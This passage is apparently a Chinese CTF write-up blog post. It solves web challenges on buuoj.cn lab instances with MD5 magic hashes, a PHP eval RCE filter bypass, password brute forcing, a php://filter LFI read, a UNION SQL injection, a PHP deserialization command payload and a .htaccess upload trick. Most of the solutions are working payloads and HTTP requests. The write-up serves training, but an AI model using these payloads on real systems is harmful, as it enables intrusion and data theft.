class="line">s1091221200a0e940624217856561557816327384675</span><br><span class="line">s1885207154a0e509367213418206700842008763514</span><br><span class="line">s1502113478a0e861580163291561247404381396064</span><br><span class="line">s1885207154a0e509367213418206700842008763514</span><br><span class="line">s1836677006a0e481036490867661113260034900752</span><br><span class="line">s155964671a0e342768416822451524974117254469</span><br><span class="line">s1184209335a0e072485820392773389523109082030</span><br><span class="line">s1665632922a0e731198061491163073197128363787</span><br><span class="line">s1502113478a0e861580163291561247404381396064</span><br><span class="line">s1836677006a0e481036490867661113260034900752</span><br><span class="line">s1091221200a0e940624217856561557816327384675</span><br><span class="line">s155964671a0e342768416822451524974117254469</span><br><span class="line">s1502113478a0e861580163291561247404381396064</span><br><span class="line">s155964671a0e342768416822451524974117254469</span><br><span class="line">s1665632922a0e731198061491163073197128363787</span><br><span class="line">s155964671a0e342768416822451524974117254469</span><br><span class="line">s1091221200a0e940624217856561557816327384675</span><br><span class="line">s1836677006a0e481036490867661113260034900752</span><br><span class="line">s1885207154a0e509367213418206700842008763514</span><br><span class="line">s532378020a0e220463095855511507588041205815</span><br><span class="line">s878926199a0e545993274517709034328855841020</span><br><span class="line">s1091221200a0e940624217856561557816327384675</span><br><span class="line">s214587387a0e848240448830537924465865611904</span><br><span class="line">s1502113478a0e861580163291561247404381396064</span><br><span class="line">s1091221200a0e940624217856561557816327384675</span><br><span class="line">s1665632922a0e731198061491163073197128363787</span><br><span class="line">s1885207154a0e509367213418206700842008763514</span><br><span class="line">s1836677006a0e481036490867661113260034900752</span><br><span class="line">s1665632922a0e731198061491163073197128363787</span><br><span class="line">s878926199a0e545993274517709034328855841020</span><br><span class="line">QNKCDZO0e830400451993494058024219903391</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">key3</span>%<span class="number">5</span>B%<span class="number">5</span>D=<span class="number">1</span>&amp;flag5=+</span></span><br></pre></td></tr></table></figure><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>依旧经典</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过了md5就可以RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i)</span><br><span class="line">    h = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h.startswith(<span class="string">&#x27;c4d038&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(s, h)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;&amp;e[v.a.l=echo `tac /f*`;</span><br></pre></td></tr></table></figure><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwords.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pwds = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwords_md5.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> pwds:</span><br><span class="line">        <span class="keyword">import</span> hashlib</span><br><span class="line">        md5val = hashlib.md5(pwd.encode()).hexdigest()</span><br><span class="line">        f.write(md5val+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/signin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>power=hacker; token=</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475/signin.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml">un=admin&amp;pw=</span><span class="template-variable">&#123;&#123;<span class="name">file:line</span>(<span class="name">D:</span>\Burpsuite\密码合集\passwords_md5.txt)&#125;&#125;</span><span class="language-xml">&amp;rem=0</span></span></span><br></pre></td></tr></table></figure><p>登录进去之后没什么用，爆破出来是<code>admin\000000</code>，登录的时候抓包获得了flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/passport/9963b7428698fdf50f4c66c7db8ff8e113c5b1e47244da406411476e536259f1.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>power=hacker; token=</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475/signin.php</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>89</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">passport=OWY<span class="number">1</span>OW<span class="name">M3</span>fGFkbWlufGIxZWE<span class="number">3</span><span class="name">M3</span>w<span class="number">2</span><span class="symbol">NzBiMTQ3</span>MjhhZDk<span class="number">5</span>MDJhZW<span class="symbol">NiYTMyZTIyZmE0</span>ZjZiZHw<span class="number">5</span>YmY<span class="number">2</span>ZXww</span></span><br></pre></td></tr></table></figure><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>看了前端的js代码是和后端的php连着的，可以直接控制台给分数然后over就行了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gameScore=<span class="number">10000000</span>;<span class="title function_">gameover</span>();</span><br></pre></td></tr></table></figure><p>但是™的发现出题人根本前后端没分离</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>18</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;score&quot;</span><span class="punctuation">:</span><span class="number">10000000</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>这样也可以</p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接用iconv就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php</span><br></pre></td></tr></table></figure><p><code>convert.iconv.*</code>的使用方式有两种</p><ul><li>一种是用<code>.</code></li><li>一种是用<code>/</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line"></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p>这题里面的就是把文件的字符编码从<code>UTF-8</code>转换成<code>UTF-16</code>，支持的字符编码有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac (alias: MacJapanese)</span><br><span class="line">SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)</span><br><span class="line">SJIS-Mobile#KDDI (alias: SJIS-KDDI)</span><br><span class="line">SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)</span><br><span class="line">UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)</span><br><span class="line">UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)</span><br><span class="line">ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)</span><br><span class="line">JIS</span><br><span class="line">JIS-ms</span><br><span class="line">CP50220</span><br><span class="line">CP50220raw</span><br><span class="line">CP50221</span><br><span class="line">CP50222</span><br><span class="line">ISO-8859-1*</span><br><span class="line">ISO-8859-2*</span><br><span class="line">ISO-8859-3*</span><br><span class="line">ISO-8859-4*</span><br><span class="line">ISO-8859-5*</span><br><span class="line">ISO-8859-6*</span><br><span class="line">ISO-8859-7*</span><br><span class="line">ISO-8859-8*</span><br><span class="line">ISO-8859-9*</span><br><span class="line">ISO-8859-10*</span><br><span class="line">ISO-8859-13*</span><br><span class="line">ISO-8859-14*</span><br><span class="line">ISO-8859-15*</span><br><span class="line">ISO-8859-16*</span><br><span class="line">byte2be</span><br><span class="line">byte2le</span><br><span class="line">byte4be</span><br><span class="line">byte4le</span><br><span class="line">BASE64</span><br><span class="line">HTML-ENTITIES (alias: HTML)</span><br><span class="line">7bit</span><br><span class="line">8bit</span><br><span class="line">EUC-CN*</span><br><span class="line">CP936</span><br><span class="line">GB18030</span><br><span class="line">HZ</span><br><span class="line">EUC-TW*</span><br><span class="line">CP950</span><br><span class="line">BIG-5*</span><br><span class="line">EUC-KR*</span><br><span class="line">UHC (alias: CP949)</span><br><span class="line">ISO-2022-KR</span><br><span class="line">Windows-1251 (alias: CP1251)</span><br><span class="line">Windows-1252 (alias: CP1252)</span><br><span class="line">CP866 (alias: IBM866)</span><br><span class="line">KOI8-R*</span><br><span class="line">KOI8-U*</span><br><span class="line">ArmSCII-8 (alias: ArmSCII8)</span><br></pre></td></tr></table></figure><p>门道很深，可以看看陆队的文章</p><p><a href="https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/">https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/</a></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>简单过滤联合注入即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union sElect 1,2,3,4,5--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">sElect</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">sElect</span> group_concat(table_name)<span class="keyword">from</span> mysql.innodb_table_stats),<span class="number">5</span><span class="comment">--+</span></span><br><span class="line"># grades,here_is_flag,gtid_slave_pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;union sElect 1,2,3,(sElect group_concat(`1`) from (sElect * from here_is_flag)a),5--+</span></span><br><span class="line"><span class="string"># 没报错说明没写错，再把flag带出来就行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">sElect</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">sElect</span> group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">Select</span> <span class="number">3</span> <span class="keyword">union</span> <span class="keyword">sElect</span> <span class="operator">*</span> <span class="keyword">from</span> here_is_flag)a),<span class="number">5</span><span class="comment">--+</span></span><br><span class="line"># <span class="number">1</span>,flag&#123;bc8317fc<span class="operator">-</span>c0b2<span class="number">-489e-879</span>d<span class="number">-111</span>a988aa848&#125;</span><br></pre></td></tr></table></figure><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="variable">$cmd1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a=new evil(&#x27;ls /&#x27;);</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>(<span class="string">&#x27;head /th1s_1s_fffflllll4444aaaggggg &#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p>上传<code>.htaccess</code>就好了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypelbI2sZUZHuXDs8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept</span><span 